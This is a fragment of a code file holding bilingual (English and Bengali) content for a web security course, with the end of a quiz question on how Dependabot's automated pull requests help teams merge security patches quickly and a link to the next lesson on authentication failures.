        answer: 0,
        hint: {
          en: 'Dependabot opens automated pull requests when security patches are released.',
          bn: 'সিকিউরিটি প্যাচ প্রকাশ পাওয়া মাত্রই ডিপেন্ডাবট স্বয়ংক্রিয় পুল রিকোয়েস্ট পাঠায়।'
        },
        explanation: {
          en: 'Automated dependency PRs coupled with automated CI testing enable engineering teams to merge security fixes within hours of disclosure, closing the exploitation window.',
          bn: 'অটোমেটেড টেস্টের সাথে যুক্ত থাকলে কয়েক ঘণ্টার মধ্যেই সিকিউরিটি প্যাচ মার্জ করে প্রোডাকশনে দেওয়া সম্ভব হয়, ফলে হ্যাকার সুযোগ পায় না।'
        },
      },
    ],
  },
  next: {
    slug: 'auth-failures',
    title: {
      en: 'Identification & Authentication Failures: Brute Force, Bcrypt & MFA',
      bn: 'প্রমাণীকরণ ত্রুটি: ব্রুট ফোর্স, bcrypt ও মাল্টি-ফ্যাক্টর অথেনটিকেশন'
    },
  },
};
